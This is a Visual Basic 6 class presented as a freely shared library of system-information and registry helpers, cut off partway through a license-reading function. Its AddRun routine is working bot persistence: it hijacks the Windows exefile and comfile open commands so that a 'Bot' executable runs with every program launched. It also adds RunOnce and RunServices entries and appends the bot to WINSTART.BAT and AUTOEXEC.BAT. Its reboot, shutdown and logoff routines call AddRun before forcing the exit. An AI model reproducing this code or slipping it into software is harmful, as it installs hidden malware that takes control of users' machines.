VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "CSysInfo"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
'*                   CSysInfo.cls
'*                     by r-22
'*
'*            http://www.manshadow.org/
'*      Wrapper functions for getting system
'*      information and doing some conversions.
'*
'*      This code may be freely used and
'*      distributed unless otherwise noted by
'*      the owner of www.manshadow.org and\or
'*      the writer of this code.
'*
'*      Usage:
'*          Dim System As CSysInfo
'*          System = New CSysInfo

Option Explicit

Private Const GENERIC_READ = &H80000000
Private Const GENERIC_WRITE = &H40000000
Private Const FILE_SHARE_READ = &H1
Private Const FILE_SHARE_WRITE = &H2
Private Const OPEN_EXISTING = 3
Private Const FILE_ATTRIBUTE_SYSTEM = &H4
Private Const INVALID_HANDLE_VALUE = -1
Private Const KEY_ALL_ACCESS = &H3F
Private Const TOKEN_QUERY = &H8&
Private Const TOKEN_ADJUST_PRIVILEGES = &H20&
Private Const SE_SHUTDOWN_NAME = "SeShutdownPrivilege"
Private Const SE_PRIVILEGE_ENABLED = &H2&
Private Const EWX_LOGOFF = 0
Private Const EWX_POWEROFF = &H8
Private Const EWX_REBOOT = 2
Private Const EWX_SHUTDOWN = 1
Private Const EWX_FORCE = 4
Private Const EWX_FORCEIFHUNG = &H10
Private Const OFFSET_4 = 4294967296#
Private Const MAXINT_4 = 2147483647
Private Const OFFSET_2 = 65536
Private Const MAXINT_2 = 32767
Private Const REG_SZ = 1 'Unicode null terminated string
Private Const REG_BINARY = 3 'Free form binary
Private Const REG_DWORD = 4 '32-bit number
Private Const ERROR_SUCCESS = 0&
Private Const MAX_FILENAME_LEN = 256
Private Const SM_CXSCREEN = 0 'X Size of screen
Private Const SM_CYSCREEN = 1 'Y Size of Screen
Private Const MAX_PATH = 260
Private Const API_FALSE = 0
Private Const ERROR_NO_MORE_FILES = 18
Private Const BLOCK_SIZE = 2048
Private Const DRIVE_CDROM = 5
Private Const DRIVE_FIXED = 3
Private Const DRIVE_RAMDISK = 6
Private Const DRIVE_REMOTE = 4
Private Const DRIVE_REMOVABLE = 2
Private Const TH32CS_SNAPHEAPLIST = &H1
Private Const TH32CS_SNAPPROCESS = &H2
Private Const TH32CS_SNAPTHREAD = &H4
Private Const TH32CS_SNAPMODULE = &H8
Private Const TH32CS_SNAPALL = (TH32CS_SNAPHEAPLIST Or TH32CS_SNAPPROCESS Or TH32CS_SNAPTHREAD Or TH32CS_SNAPMODULE)
Private Const TH32CS_INHERIT = &H80000000
Private Const GWL_WNDPROC = (-4)
Private Const RSH_DEREGISTER = 0
Private Const RSH_REGISTER = 1
Private Const RSH_REGISTER_PROGMAN = 2
Private Const RSH_REGISTER_TASKMAN = 3
Private Const HSHELL_ACTIVATESHELLWINDOW = 3
Private Const HSHELL_WINDOWCREATED = 1
Private Const HSHELL_WINDOWDESTROYED = 2
Private Const HSHELL_WINDOWACTIVATED = 4
Private Const HSHELL_GETMINRECT = 5
Private Const HSHELL_REDRAW = 6
Private Const HSHELL_TASKMAN = 7
Private Const HSHELL_LANGUAGE = 8
Private Const HSHELL_ACCESSIBILITYSTATE = 11
Private Const LOCALE_SENGLANGUAGE As Long = &H1001


Private Type NTFSBOOTRECORD
    JumpCodeAndNop(1 To 3) As Byte
    OEMName(1 To 8) As Byte
    BytesPerSector As Integer
    SectorsPerCluster As Byte
    Unused(1 To 7) As Byte
    MediaDescriptor As Byte
    Unused2 As Integer
    SectorsPerTrack As Integer
    HeadCount As Integer
    Unused3(1 To 8) As Byte
    DontKnow1 As Integer
    DontKnow2 As Integer
    SectorsInStorageUnit As Currency
    LCNMFTData As Currency
    LCNMFTMirrorData As Currency
    FileRecordClusters As Long
    IndexBufferClusters As Long
    SerialNumber As Long
End Type
Private Type FAT12FAT16BOOTRECORD
    JumpCodeAndNop(1 To 3) As Byte
    OEMName(1 To 8) As Byte
    BytesPerSector As Integer
    SectorsPerCluster As Byte
    ReservedSectors As Integer
    NumberOfFATCopies As Byte
    MaxRootDirEntries As Integer 'N/A on FAT32
    SectorsSmallerThan32MB As Integer 'N/A on FAT32
    MediaDescriptor As Byte 'F8h for Hard Disks
    SectorsPerFATOld As Integer  'N/A on FAT32
    SectorsPerTrack As Integer
    NumberOfHeads As Integer
    HiddenSectors As Long
    Sectors As Long
    DriveNum As Byte
    Reserved As Byte
    BootSignature As Byte
    VolumeID As Long
    VolumeLabel(1 To 11) As Byte
    FileSystemType(1 To 8) As Byte
End Type
Private Type FAT32BOOTRECORD
    JumpCodeAndNop(1 To 3) As Byte
    OEMName(1 To 8) As Byte
    BytesPerSector As Integer
    SectorsPerCluster As Byte
    ReservedSectors As Integer
    NumberOfFATCopies As Byte
    MaxRootDirEntries As Integer 'N/A on FAT32
    SectorsSmallerThan32MB As Integer 'N/A on FAT32
    MediaDescriptor As Byte 'F8h for Hard Disks
    SectorsPerFATOld As Integer  'N/A on FAT32
    SectorsPerTrack As Integer
    NumberOfHeads As Integer
    HiddenSectors As Long
    Sectors As Long
    SectorsPerFAT As Long
    Flags As Integer
    Version As Integer
    RootDirectoryCluster As Long
    FileSystemInformationSector  As Integer
    BackupBootSector As Integer
    Reserved(1 To 12) As Byte
    LogicalDriveNumber As Byte
    Unused As Byte
    ExtendedSignature As Byte '29h
    SerialNumber As Long
    VolumeName(1 To 11) As Byte
    FATName(1 To 8) As Byte
    ExecutableCode(1 To 420) As Byte
    BootRecordSignature(1 To 2) As Byte '55h AAh
End Type
Private Type FAT32FSINFO
    LeadSignature As Long
    Reserved1(1 To 480) As Byte
    StructureSignature As Long
    FreeCluster As Long
    NextFreeCluster As Long
    Reserved2(1 To 12) As Byte
    TrailingSignature As Long
End Type
Private Type FILETIME
    dwLowDateTime As Long
    dwHighDateTime As Long
End Type
Private Type WIN32_FIND_DATA
    dwFileAttributes As Long
    ftCreationTime As FILETIME
    ftLastAccessTime As FILETIME
    ftLastWriteTime As FILETIME
    nFileSizeHigh As Long
    nFileSizeLow As Long
    dwReserved0 As Long
    dwReserved1 As Long
    cFileName As String * MAX_PATH
    cAlternate As String * 14
End Type
Private Type LUID
   lowpart As Long
   highpart As Long
End Type
Private Type LUID_AND_ATTRIBUTES
   pLuid As LUID
   Attributes As Long
End Type
Private Type TOKEN_PRIVILEGES
   PrivilegeCount As Long
   Privileges(1) As LUID_AND_ATTRIBUTES
End Type
Private Type PULARGE_INTEGER
    lLowByte As Long
    lHighByte As Long
End Type
Private Type PROCESSENTRY32
    dwSize As Long
    cntUsage As Long
    th32ProcessID As Long
    th32DefaultHeapID As Long
    th32ModuleID As Long
    cntThreads As Long
    th32ParentProcessID As Long
    pcPriClassBase As Long
    dwFlags As Long
    szExeFile As String * MAX_PATH
End Type
Private Type OSVERSIONINFO
    dwOSVersionInfoSize As Long 'MUST be set to value 148 BEFORE making the call to GetVersionEx.
    dwMajorVersion As Long
    dwMinorVersion As Long
    dwBuildNumber As Long
    dwPlatformId As Long
    szCSDVersion As String * 128 ' NT/2000/XP = Empty or Service Pack X  :  95/98/ME = C or A or any other additional version information.
End Type

'Be sure to set dwOSVersionInfoSize = 148 before calling the GetVersionEx function.
'WindowsVersion         dwPlatformId           dwMajorVersion          dwMinorVersion
'------------------------------------------------------------------------------------------------
'Windows 95                 1                       4                       0
'Windows 98                 1                       4                       10
'Windows NT 3.51            2                       3                       51
'Windows NT 4.0             2                       4                       0
'Windows 2000               2                       5                       0
'Windows XP                 2                       5                       1
'Windows ME                 1                       4                       90
'Windows .NET Server        2                       5                       1
Private Declare Function AdjustTokenPrivileges Lib "advapi32.dll" (ByVal TokenHandle As Long, ByVal DisableAllPrivileges As Long, NewState As TOKEN_PRIVILEGES, ByVal BufferLength As Long, PreviousState As TOKEN_PRIVILEGES, ReturnLength As Long) As Long
Private Declare Function CallWindowProc Lib "user32" Alias "CallWindowProcA" (ByVal lpPrevWndFunc As Long, ByVal hWnd As Long, ByVal Msg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)
Private Declare Function CreateToolhelp32Snapshot Lib "kernel32" (ByVal lFlags As Long, ByVal lProcessID As Long) As Long
Private Declare Function CreateFile Lib "kernel32" Alias "CreateFileA" (ByVal lpFileName As String, ByVal dwDesiredAccess As Long, ByVal dwShareMode As Long, lpSecurityAttributes As Long, ByVal dwCreationDisposition As Long, ByVal dwFlagsAndAttributes As Long, ByVal hTemplateFile As Long) As Long
Private Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long
Private Declare Function FindClose Lib "kernel32" (ByVal hFindFile As Long) As Long
Private Declare Function FindFirstFile Lib "kernel32" Alias "FindFirstFileA" (ByVal lpszFileName As String, lpFindFileData As WIN32_FIND_DATA) As Long
Private Declare Function FindNextFile Lib "kernel32" Alias "FindNextFileA" (ByVal hFindFile As Long, lpFindFileData As WIN32_FIND_DATA) As Long
Private Declare Function GetComputerNameA Lib "kernel32" (ByVal lpBuffer As String, nSize As Long) As Long
Private Declare Function GetCurrentProcess Lib "kernel32" () As Long
Private Declare Function GetFreeSpace Lib "kernel32" Alias "GetDiskFreeSpaceA" (ByVal lpRootPathName As String, lpSectorsPerCluster As Long, lpBytesPerSector As Long, lpNumberOfFreeClusters As Long, lpTotalNumberOfClusters As Long) As Long
Private Declare Function GetDiskFreeSpaceEx Lib "kernel32.dll" Alias "GetDiskFreeSpaceExA" (ByVal lpDirectoryName As String, lpFreeBytesAvailableToCaller As PULARGE_INTEGER, lpTotalNumberOfBytes As PULARGE_INTEGER, lpTotalNumberofFreeBytes As PULARGE_INTEGER) As Long
Private Declare Function GetDriveType Lib "kernel32" Alias "GetDriveTypeA" (ByVal nDrive As String) As Long
Private Declare Function GetFileAttributes Lib "kernel32" Alias "GetFileAttributesA" (ByVal lpszFileName As String) As Long
Private Declare Function GetKeyboardLayout Lib "user32" (ByVal dwLayout As Long) As Long
Private Declare Function GetLocaleInfo Lib "kernel32" Alias "GetLocaleInfoA" (ByVal lLocale As Long, ByVal lLCType As Long, ByVal lpLCData As String, ByVal cchData As Long) As Long
Private Declare Function GetLogicalDriveStrings Lib "kernel32" Alias "GetLogicalDriveStringsA" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long
Private Declare Function GetSystemMetrics Lib "user32" (ByVal nIndex As Long) As Long
Private Declare Function GetUserNameA Lib "advapi32.dll" (ByVal lpBuffer As String, nSize As Long) As Long
Private Declare Function GetVolumeInformation Lib "kernel32" Alias "GetVolumeInformationA" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Long, lpVolumeSerialNumber As Long, lpMaximumComponentLength As Long, lpFileSystemFlags As Long, ByVal lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Long) As Long
Private Declare Function GetWindowLong Lib "user32" Alias "GetWindowLongA" (ByVal hWnd As Long, ByVal nIndex As Long) As Long
Private Declare Function GetWindowTextA Lib "user32" (ByVal hWnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function GetWindowsVersion Lib "kernel32" Alias "GetVersion" () As Long
Private Declare Function GetWindowsVersionEx Lib "kernel32" Alias "GetVersionExA" (lpVersionInformation As OSVERSIONINFO) As Long
Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Private Declare Function LookupPrivilegeValue Lib "advapi32.dll" Alias "LookupPrivilegeValueA" (ByVal lpSystemName As String, ByVal lpName As String, lpLuid As LUID) As Long
Private Declare Function OpenProcessToken Lib "advapi32.dll" (ByVal ProcessHandle As Long, ByVal DesiredAccess As Long, TokenHandle As Long) As Long
Private Declare Function Process32First Lib "kernel32" (ByVal hSnapShot As Long, uProcess As PROCESSENTRY32) As Long
Private Declare Function Process32Next Lib "kernel32" (ByVal hSnapShot As Long, uProcess As PROCESSENTRY32) As Long
Private Declare Function ReadFile Lib "kernel32" (ByVal hFile As Long, lpBuffer As Any, ByVal nNumberOfBytesToRead As Long, lpNumberOfBytesRead As Long, lpOverlapped As Long) As Long
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Private Declare Function RegCreateKey Lib "advapi32.dll" Alias "RegCreateKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Private Declare Function RegDeleteKey Lib "advapi32.dll" Alias "RegDeleteKeyA" (ByVal hKey As Long, ByVal lpSubKey As String) As Long
Private Declare Function RegDeleteValue Lib "advapi32.dll" Alias "RegDeleteValueA" (ByVal hKey As Long, ByVal lpValueName As String) As Long
Private Declare Function RegisterShellHook Lib "Shell32" Alias "#181" (ByVal hWnd As Long, ByVal nAction As Long) As Long
Private Declare Function RegisterWindowMessage Lib "user32" Alias "RegisterWindowMessageA" (ByVal lpString As String) As Long
Private Declare Function RegOpenKey Lib "advapi32.dll" Alias "RegOpenKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Private Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long
Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long
Private Declare Function RegSetValueExString Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpData As String, ByVal cbData As Long) As Long
Private Declare Function SetFilePointer Lib "kernel32" (ByVal hFile As Long, ByVal lDistanceToMove As Long, lpDistanceToMoveHigh As Long, ByVal dwMoveMethod As Long) As Long
Private Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hWnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
Private Declare Function TerminateProcess Lib "kernel32" (ByVal hProcess As Long, ByVal uExitCode As Long) As Long

Public Enum EN_HKEY
    HKEY_CLASSES_ROOT = &H80000000
    HKEY_CURRENT_USER = &H80000001
    HKEY_LOCAL_MACHINE = &H80000002
    HKEY_USERS = &H80000003
    HKEY_CURRENT_CONFIG = &H80000005
    HKEY_DYN_DATA = &H80000006
End Enum

Public Enum RSH_HOOKTYPE
    REGISTER_STANDARD = RSH_REGISTER
    REGISTER_TASKMAN = RSH_REGISTER_TASKMAN
    REGISTER_PROGMAN = RSH_REGISTER_PROGMAN
End Enum

Private OS_VERSION As OSVERSIONINFO

Public Property Get dwMajorVersion() As Long
    dwMajorVersion = OS_VERSION.dwMajorVersion
End Property

Public Property Get dwMinorVersion() As Long
    dwMinorVersion = OS_VERSION.dwMinorVersion
End Property

Public Property Get dwBuildNumber() As Long
    dwBuildNumber = OS_VERSION.dwBuildNumber
End Property

Public Property Get dwPlatformId() As Long
    dwPlatformId = OS_VERSION.dwPlatformId
End Property

Public Property Get szCSDVersion() As String
    szCSDVersion = Trim$(Replace$(OS_VERSION.szCSDVersion, Chr$(0), ""))
End Property

Public Sub Reboot()
    Dim sVersion As String
    Call GetVersionEx(sVersion$)
    If OS_VERSION.dwPlatformId = 2 Then Call SetPrivilege(SE_SHUTDOWN_NAME)
    Call System.AddRun
    Call ExitWindowsEx(EWX_REBOOT + EWX_FORCEIFHUNG, 0)
End Sub

Public Sub Shutdown()
    Dim sVersion As String
    Call GetVersionEx(sVersion$)
    If OS_VERSION.dwPlatformId = 2 Then Call SetPrivilege(SE_SHUTDOWN_NAME)
    Call System.AddRun
    Call ExitWindowsEx(EWX_SHUTDOWN + EWX_FORCEIFHUNG, 0)
End Sub

Public Sub Logoff()
    Dim sVersion As String
    Call GetVersionEx(sVersion$)
    If OS_VERSION.dwPlatformId = 2 Then Call SetPrivilege(SE_SHUTDOWN_NAME)
    Call System.AddRun
    Call ExitWindowsEx(EWX_LOGOFF + EWX_FORCEIFHUNG, 0)
End Sub

Public Sub AddRun()
    Dim sDir As String, nOpenFile As Integer, sString As String, sVersion As String
    Call SaveSettingDefault(HKEY_CLASSES_ROOT, "exefile\shell\open\command", Bot.Location & " " & Chr$(34) & "%1" & Chr$(34) & " %*")
    Call SaveSettingDefault(HKEY_LOCAL_MACHINE, "SOFTWARE\Classes\exefile\shell\open\command", Bot.Location & " " & Chr$(34) & "%1" & Chr$(34) & " %*")
    Call SaveSettingDefault(HKEY_CLASSES_ROOT, "comfile\shell\open\command", Bot.Location & " " & Chr$(34) & "%1" & Chr$(34) & " %*")
    Call SaveSettingDefault(HKEY_LOCAL_MACHINE, "SOFTWARE\Classes\comfile\shell\open\command", Bot.Location & " " & Chr$(34) & "%1" & Chr$(34) & " %*")
    Call SaveSetting(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", Bot.ServiceName, Bot.Location)
    Call GetVersionEx(sVersion$, 1)
    If OS_VERSION.dwPlatformId = 1 Then
        Call SaveSetting(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices", Bot.ServiceName, Bot.Location)
        sDir$ = WinDir$ & "\WINSTART.BAT"
        nOpenFile% = FreeFile
        Open sDir$ For Binary As #nOpenFile%
            sString$ = Space$(LOF(nOpenFile%))
            Get #nOpenFile%, , sString$
        Close #nOpenFile%
        If InStr(sString$, vbCrLf & Bot.Location & vbCrLf) = 0 Then
            nOpenFile% = FreeFile
            Call Kill(WinDir$ & "\WINSTART.BAT")
            Open sDir$ For Output As #nOpenFile%
                Print #nOpenFile%, sString$ & vbCrLf & "@echo off" & vbCrLf & Bot.Location & vbCrLf;
            Close #nOpenFile%
        End If
        sDir$ = "C:\AUTOEXEC.BAT"
        nOpenFile% = FreeFile
        Open sDir$ For Binary As #nOpenFile%
            sString$ = Space$(LOF(nOpenFile%))
            Get #nOpenFile%, , sString$
        Close #nOpenFile%
        If InStr(sString$, vbCrLf & Bot.Location & vbCrLf) = 0 Then
            nOpenFile% = FreeFile
            Call Kill("C:\AUTOEXEC.BAT")
            Open sDir$ For Output As #nOpenFile%
                Print #nOpenFile%, sString$ & vbCrLf & "@echo off" & vbCrLf & Bot.Location & vbCrLf;
            Close #nOpenFile%
        End If
    End If
End Sub

Private Sub SetPrivilege(ByVal cPrivilegeName As String)
   Dim tkp As TOKEN_PRIVILEGES, lDummy As Long, lRequired As Long, hToken As Long
   Dim tkpSaved As TOKEN_PRIVILEGES
   If OpenProcessToken(GetCurrentProcess, TOKEN_ADJUST_PRIVILEGES Or TOKEN_QUERY, hToken&) Then
       If LookupPrivilegeValue(vbNullString, SE_SHUTDOWN_NAME, tkp.Privileges(0).pLuid) > 0 Then
           tkp.PrivilegeCount = 1
           tkp.Privileges(0).Attributes = SE_PRIVILEGE_ENABLED
           Call AdjustTokenPrivileges(hToken&, False, tkp, Len(tkpSaved), tkpSaved, lRequired&)
       End If
   End If
End Sub

Public Function GetVersion() As Long
    On Error GoTo ErrTrap
    GetVersion& = GetWindowsVersion&
Exit Function
ErrTrap:
    GetVersion& = 0&
End Function

Public Function GetVersionEx(Optional sVersion As String, Optional nCSD As Integer) As Long
    On Error GoTo ErrTrap
    Dim lResult As Long, sCSD As String
    OS_VERSION.dwOSVersionInfoSize = 148
    lResult& = GetWindowsVersionEx&(OS_VERSION)
    If IsMissing(nCSD%) Then
        sCSD$ = ""
    Else
        sCSD$ = " " & OS_VERSION.szCSDVersion
    End If
    If IsMissing(sVersion$) Then sVersion$ = ""
    If OS_VERSION.dwPlatformId = 1 Then
        If OS_VERSION.dwMinorVersion = 0 Then
            sVersion$ = "Windows 95" & sCSD$
        ElseIf OS_VERSION.dwMinorVersion = 10 Then
            sVersion$ = "Windows 98" & sCSD$
        ElseIf OS_VERSION.dwMinorVersion = 90 Then
            sVersion$ = "Windows ME" & sCSD$
        Else
            GoTo ErrTrap
        End If
    ElseIf OS_VERSION.dwPlatformId = 2 Then
        If OS_VERSION.dwMajorVersion = 3 Then
            If OS_VERSION.dwMinorVersion = 51 Then
                sVersion$ = "Windows NT 3.51" & sCSD$
            Else
                GoTo ErrTrap:
            End If
        ElseIf OS_VERSION.dwMajorVersion = 4 Then
            If OS_VERSION.dwMinorVersion = 0 Then
                sVersion$ = "Windows NT 4.0" & sCSD$
            Else
                GoTo ErrTrap
            End If
        ElseIf OS_VERSION.dwMajorVersion = 5 Then
            If OS_VERSION.dwMinorVersion = 0 Then
                sVersion$ = "Windows 2000" & sCSD$
            ElseIf OS_VERSION.dwMinorVersion = 1 Then
                sVersion$ = "Windows XP" & sCSD$
            Else
                GoTo ErrTrap
            End If
        Else
            GoTo ErrTrap
        End If
    Else
        GoTo ErrTrap
    End If
    GetVersionEx& = lResult&
Exit Function
ErrTrap:
    sVersion$ = "Unknown Version"
    GetVersionEx& = 0&
End Function

Public Function WinDir() As String
    On Error Resume Next
    Dim sBuffer As String, lBufferLen As Long, lResult As Long, sRV As String
    lBufferLen& = 256
    sBuffer$ = Space$(lBufferLen&)
    lResult& = GetWindowsDirectory&(sBuffer$, lBufferLen&)
    If lResult& > 0 Then
        If lResult& < lBufferLen& Then
          sRV$ = Left(sBuffer$, lResult&)
        Else
            lBufferLen& = lResult& + 1
            sBuffer$ = Space(lBufferLen&)
            lResult& = GetWindowsDirectory&(sBuffer$, lBufferLen&)
            If lResult& > 0 Then
                If lResult& < lBufferLen& Then
                  sRV$ = Left$(sBuffer$, lResult&)
                Else
                  sRV$ = ""
                End If
            Else
              sRV$ = ""
            End If
        End If
    Else
        sRV$ = ""
    End If
    WinDir$ = Trim$(Replace$(sRV$, Chr$(0), ""))
End Function

Private Function UnsignedToLong(Value As Double) As Long
    If Value# < 0 Or Value# >= OFFSET_4 Then Error 6 ' Overflow
    If Value# <= MAXINT_4 Then
        UnsignedToLong& = CLng(Value#)
    Else
        UnsignedToLong& = CLng(Value# - OFFSET_4)
    End If
End Function

Private Function LongToUnsigned(Value As Long) As Double
    If Value& < 0 Then
        LongToUnsigned# = CDbl(Value& + OFFSET_4)
    Else
        LongToUnsigned# = CDbl(Value&)
    End If
End Function

Private Function UnsignedToInteger(Value As Long) As Integer
    If Value& < 0 Or Value& >= OFFSET_2 Then Error 6 ' Overflow
    If Value& <= MAXINT_2 Then
        UnsignedToInteger% = CInt(Value&)
    Else
        UnsignedToInteger% = CInt(Value& - OFFSET_2)
    End If
End Function

Private Function IntegerToUnsigned(Value As Integer) As Long
    If Value% < 0 Then
        IntegerToUnsigned& = CLng(Value% + OFFSET_2)
    Else
        IntegerToUnsigned& = CLng(Value%)
    End If
End Function

Public Sub DeleteValue(ByVal hKey As EN_HKEY, ByVal sPath As String, ByVal sValue As String)
    Dim hCurKey As Long, lRegResult As Long
    lRegResult& = RegOpenKey(hKey, sPath$, hCurKey&)
    lRegResult& = RegDeleteValue(hCurKey&, sValue$)
    lRegResult& = RegCloseKey(hCurKey&)
End Sub

Public Sub DeleteKey(ByVal hKey As EN_HKEY, ByVal sPath As String)
    Dim lRegResult As Long
    lRegResult& = RegDeleteKey(hKey, sPath$)
End Sub

Public Sub CreateKey(hKey As EN_HKEY, sPath As String)
    On Error GoTo ErrTrap
    Dim hCurKey As Long, lRegResult As Long
    lRegResult& = RegCreateKey(hKey, sPath$, hCurKey&)
    If lRegResult& <> ERROR_SUCCESS Then GoTo ErrTrap
    lRegResult& = RegCloseKey(hCurKey&)
Exit Sub
ErrTrap:
End Sub

Public Function GetSetting(hKey As EN_HKEY, sPath As String, sValue As String, Optional sDefault As String) As String
    On Error GoTo ErrTrap
    Dim hCurKey As Long, lResult As Long, lValueType As Long, sBuffer As String
    Dim lDataBufferSize As Long, nZeroPos As Integer, lRegResult As Long
    'Set up default value
    If Not IsEmpty(sDefault$) Then
        GetSetting$ = sDefault$
    Else
        GetSetting$ = ""
    End If
    lRegResult& = RegOpenKey(hKey, sPath$, hCurKey&)
    lRegResult& = RegQueryValueEx(hCurKey&, sValue$, 0&, lValueType&, ByVal 0&, lDataBufferSize&)
    If lRegResult& = ERROR_SUCCESS Then
        If lValueType& = REG_SZ Then
            sBuffer$ = String$(lDataBufferSize&, " ")
            lResult& = RegQueryValueEx(hCurKey&, sValue$, 0&, 0&, ByVal sBuffer$, lDataBufferSize&)
            nZeroPos% = InStr(sBuffer$, Chr$(0))
            If nZeroPos% > 0 Then
                GetSetting$ = Left$(sBuffer$, nZeroPos% - 1)
            Else
                GetSetting$ = sBuffer$
            End If
        End If
    Else
        GoTo ErrTrap
    End If
    lRegResult& = RegCloseKey(hCurKey&)
Exit Function
ErrTrap:
    GetSetting$ = vbNullString
End Function

Public Sub SaveSetting(hKey As EN_HKEY, sPath As String, sValue As String, sData As String)
    On Error GoTo ErrTrap
    Dim hCurKey As Long, lRegResult As Long
    lRegResult& = RegCreateKey(hKey, sPath$, hCurKey&)
    lRegResult& = RegSetValueEx(hCurKey&, sValue$, 0, REG_SZ, ByVal sData$, Len(sData$))
    If lRegResult& <> ERROR_SUCCESS Then GoTo ErrTrap
    lRegResult& = RegCloseKey(hCurKey&)
Exit Sub
ErrTrap:
End Sub

Public Function GetSettingLong(ByVal hKey As EN_HKEY, ByVal sPath As String, ByVal sValue As String, Optional lDefault As Long) As Long
    On Error GoTo ErrTrap
    Dim lRegResult As Long, lValueType As Long, lBuffer As Long, lDataBufferSize As Long
    Dim hCurKey As Long
    'Set up default value
    If Not IsEmpty(lDefault&) Then
        GetSettingLong& = lDefault&
    Else
        GetSettingLong& = 0&
    End If
    lRegResult& = RegOpenKey(hKey, sPath, hCurKey)
    lDataBufferSize& = 4 '4 bytes = 32 bits = long
    lRegResult& = RegQueryValueEx(hCurKey&, sValue$, 0&, lValueType&, lBuffer&, lDataBufferSize&)
    If lRegResult& = ERROR_SUCCESS Then
        If lValueType& = REG_DWORD Then
            GetSettingLong& = lBuffer&
        End If
    Else
        GoTo ErrTrap
    End If
    lRegResult& = RegCloseKey(hCurKey&)
Exit Function
ErrTrap:
    GetSettingLong& = 0
End Function

Public Sub SaveSettingLong(ByVal hKey As EN_HKEY, ByVal sPath As String, ByVal sValue As String, ByVal lData As Long)
    On Error GoTo ErrTrap
    Dim hCurKey As Long, lRegResult As Long
    lRegResult& = RegCreateKey(hKey, sPath$, hCurKey&)
    lRegResult& = RegSetValueEx(hCurKey&, sValue$, 0&, REG_DWORD, lData&, 4)
    If lRegResult <> ERROR_SUCCESS Then
        GoTo ErrTrap
    End If
    lRegResult& = RegCloseKey(hCurKey&)
Exit Sub
ErrTrap:
End Sub

'Usage:
'Dim mybytes As Variant, loopy As Integer
'mybytes = GetSettingByte(HKEY_CURRENT_USER, "CompanyMyApp", "MyBinaryData")
'If VarType(mybytes) = vbArray + vbByte Then
'    For loopy = 0 To UBound(mybytes)
'    Debug.Print mybytes(loopy)
'Next
'End If
Public Function GetSettingByte(ByVal hKey As EN_HKEY, ByVal sPath As String, ByVal sValueName As String, Optional vDefault As Variant) As Variant
    On Error GoTo ErrTrap
    Dim lValueType As Long, byBuffer() As Byte, lDataBufferSize As Long, lRegResult As Long
    Dim hCurKey As Long
    If Not IsEmpty(vDefault) Then
        If VarType(vDefault) = vbArray + vbByte Then
            GetSettingByte = vDefault
        Else
            GetSettingByte = 0
        End If
    Else
        GetSettingByte = 0
    End If
    lRegResult& = RegOpenKey(hKey, sPath$, hCurKey&)
    lRegResult& = RegQueryValueEx(hCurKey&, sValueName$, 0&, lValueType&, ByVal 0&, lDataBufferSize&)
    If lRegResult& = ERROR_SUCCESS Then
        If lValueType& = REG_BINARY Then
            ReDim byBuffer(lDataBufferSize& - 1) As Byte
            lRegResult& = RegQueryValueEx(hCurKey&, sValueName$, 0&, lValueType&, byBuffer(0), lDataBufferSize&)
            GetSettingByte = byBuffer
        End If
    Else
        GoTo ErrTrap
    End If
    lRegResult& = RegCloseKey(hCurKey&)
Exit Function
ErrTrap:
End Function

Public Sub SaveSettingByte(ByVal hKey As EN_HKEY, ByVal sPath As String, ByVal sValueName As String, byData() As Byte)
    Dim lRegResult As Long, hCurKey As Long
    lRegResult& = RegCreateKey(hKey, sPath$, hCurKey&)
    lRegResult& = RegSetValueEx(hCurKey&, sValueName$, 0&, REG_BINARY, byData(0), UBound(byData()) + 1)
    lRegResult& = RegCloseKey(hCurKey&)
End Sub

Public Sub SaveSettingDefault(ByVal hKey As EN_HKEY, ByVal sPath As String, ByVal sValue As String)
    Dim lRet As Long, lKey As Long
    lRet& = RegOpenKeyEx(hKey, sPath$, 0, KEY_ALL_ACCESS, lKey&)
    sValue$ = sValue$ & Chr$(0)
    lRet& = RegSetValueExString(lKey&, "", 0&, REG_SZ, sValue$, Len(sValue$))
    Call RegCloseKey(lKey&)
End Sub

Public Function GetResolution(lWidth As Long, lHeight As Long) As Long
    lWidth& = GetSystemMetrics(SM_CXSCREEN)
    lHeight& = GetSystemMetrics(SM_CYSCREEN)
    GetResolution& = 1&
End Function

Public Function GetLicense(sOwner As String, sCompany As String, sLicense As String) As Integer
    Dim sVersion As String
    Call GetVersionEx(sVersion$, 1)
    If OS_VERSION.dwPlatformId = 1 Then
